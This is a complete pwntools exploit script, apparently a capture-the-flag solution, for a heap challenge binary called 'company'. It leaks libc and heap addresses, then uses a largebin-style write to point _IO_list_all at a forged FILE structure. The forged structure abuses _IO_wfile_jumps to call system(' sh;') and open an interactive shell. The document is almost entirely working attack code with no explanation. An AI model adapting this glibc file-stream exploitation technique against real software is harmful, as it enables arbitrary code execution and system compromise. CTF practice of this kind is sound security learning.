from pwn import *
from sys import *

elf = context.binary = ELF("./company")
p = process("./company")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'company-v2.chal.crewc.tf'
PORT = 17002


cmd = """
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

def add(idx, size, name, position, salary):
	sleep(0.1)
	p.sendlineafter(b'>> ', b'1')
	p.sendlineafter(b': ', str(idx))
	p.sendlineafter(b": ", str(size))
	p.sendafter(b': ', name);
	p.sendafter(b': ', position);
	p.sendlineafter(b': ', str(salary))

def delete(idx):
	sleep(0.1)
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b': ', str(idx))

def feedback(idx, idx2, feedback):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b'? ', str(idx))
	p.sendlineafter(b"? ", str(idx2))
	p.sendafter(b': ', feedback)

def view(idx):
	p.sendlineafter(b'>> ', b'4')
	p.sendlineafter(b'? ', str(idx))

def edit(idx, salary):
	sleep(0.1)
	p.sendlineafter(b'>> ', b'5')
	p.sendlineafter(b'? ', str(idx))
	p.sendlineafter(b': ', str(salary))

def defuscate(x,l=64):
	p = 0
	for i in range(l*4,0,-4): # 16 nibble
		v1 = (x & (0xf << i )) >> i
		v2 = (p & (0xf << i+12 )) >> i+12
		p |= (v1 ^ v2) << i
	return p

def obfuscate(p, adr):
	return p^(adr>>12)

def offset2size(ofs):
	return ((ofs) * 2 - 0x10)

p.sendafter(b'name? ', b'Linz')
add(0, 0x928, b'0', b'0', 0x0)
add(1, 0x528, b'0', b'HR\x00', 0x100)
g = cyclic_gen()
payload = g.get(0x4e0-8)
payload += b' sh;\x00\x00\x00\x00'
feedback(1, 1, payload)
delete(1)

add(2, 0x518, b'0', b'HR\x00', 0x100)
add(3, 0x918, b'0', b'HR\x00', 0x100)
add(4, 0x518, b'0', b'HR\x00', 0x100)
#leak libc
delete(0)
view(0)
p.recvuntil(b'Name: ')
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - 0x1f6ce0
print(hex(libc.address),hex(leak))

#leak heap
delete(3)
view(3)
p.recvuntil(b'Name: ')
heap_base = u64(p.recvn(6).ljust(8, b'\x00')) - 0x290
print(hex(heap_base))

#remove unsorted bin
add(5, 0x928, b'0', p64(0x901), 0x100)
add(6, 0x918, b'0', b'HR\x00', 0x100)
target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps

_lock = libc.address+0x1f8a20
fake_IO_FILE = heap_base + 0x10e0


payload = p64(0x0)*6
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(_lock)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(fake_IO_FILE+0xe0)
payload += p64(0x0)*6
payload += p64(_IO_wfile_jumps)
payload += b'A'*0x18
payload += p64(0x0)
payload += b'A'*0x10
payload += p64(0x0)
payload += b'A'*0xa8
payload += p64(fake_IO_FILE+0x200)
payload += b'A'*0xa0
payload += p64(libc.sym['system'])
payload = payload.ljust(0x800, b'A')

# # print(len(payload))
feedback(6, 6, payload)
delete(5)
add(7, 0x938, b'0', b'HR\x00', 0x100)
delete(6)
edit(5, target_addr-0x20)
add(8, 0x938, b'0', b'HR\x00', 0x100)
p.sendlineafter(b'>> ', b'10')
"""
pwndbg> p 0xab1-0xa81
$6 = 48
"""
p.interactive()
